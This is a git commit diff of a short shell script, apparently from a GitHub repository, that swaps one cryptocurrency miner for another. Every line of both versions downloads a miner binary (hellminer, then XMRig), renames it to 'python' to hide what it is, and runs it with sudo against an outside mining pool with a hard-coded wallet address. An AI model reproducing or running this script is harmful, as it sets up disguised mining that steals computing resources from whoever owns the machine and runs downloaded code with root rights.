516232791a649416f031d2632a8fb9f024bd40da
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-09-24 10:59:00 +0700

    Update DOGE_unminerable.sh

--- DOGE_unminerable.sh
+++ DOGE_unminerable.sh
@@ -1,4 +1,5 @@
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar -xf hellminer_cpu_linux.tar.gz
-mv hellminer python
-sudo ./python -c stratum+tcp://na.luckpool.net:3956#xnsub -u RKkLHBc3WV9w3cJ8tQuEy7NcLKdSuVFzUP.Rig001 -p x --cpu 4
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
+tar -xf xmrig-6.15.1-linux-x64.tar.gz
+cd xmrig-6.15.1
+mv xmrig python
+sudo ./python -o us-west.minexmr.com:4444 -u 878g8ZsJ65oWcPxsugXyWaS7Eo2peDZpdGxZSVBuMb2kZXr9YC1LbMp86KXs3eoVHfGhNtNS417PRWfRK8nqLN8pSwRnKEN
